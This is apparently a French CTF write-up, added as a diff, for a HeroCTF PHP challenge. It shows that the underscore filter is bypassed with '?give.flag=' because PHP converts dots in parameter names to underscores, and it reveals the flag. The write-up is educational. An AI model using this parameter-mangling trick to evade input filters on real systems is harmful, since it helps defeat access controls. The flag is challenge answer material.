@@ -1,0 +1,53 @@
+Solution:
+
+En cliquant sur le lien du challenge arrive sur du code php:
+
+<?php
+
+include "flag.php"; // <--- flag here :) you can't see it
+
+function source() {
+    echo "<br><code>";
+    highlight_string(file_get_contents(__FILE__));
+    echo "</code>";
+}
+
+function quit()
+{
+    echo "<img src='https://media.giphy.com/media/15aGGXfSlat2dP6ohs/giphy.gif'/> <br>";
+    source();
+    exit();
+}
+
+$query = urldecode($_SERVER['QUERY_STRING']);
+if(preg_match("/ |_/", $query)) quit();
+
+if(isset($_GET['give_flag'])) {
+    echo "<img src='https://media.giphy.com/media/d4blihcFNkwE3fEI/giphy.gif'/> <br>";
+    echo "FLAG: " . $FLAG;
+}
+
+
+source();
+
+?>
+
+On devine facilement qu'il faut donner un paramêtre à l'option 'give_flag' pour obtenir le flag: 
+
+    if(isset($_GET['give_flag'])) {
+
+Cependant 2 lignes plus tôt on voit un preg_match de la requête:
+
+if(preg_match("/ |_/", $query)) quit();
+
+Cette ligne signifie que si il y a un '_' or ' ' dans la requête, on appelle la fonction quit().
+On va alors chercher à ne pas utiliser _ dans give_flag.
+
+Il se trouve que les points dans l'url des requête sont transformés en _ par php:
+
+On essaie:
+http://challs.heroctf.fr:8080/?give.flag=
+
+Et le flag apparaît !
+
+FLAG: Hero{h0w_70_pr36_m47ch_10381}
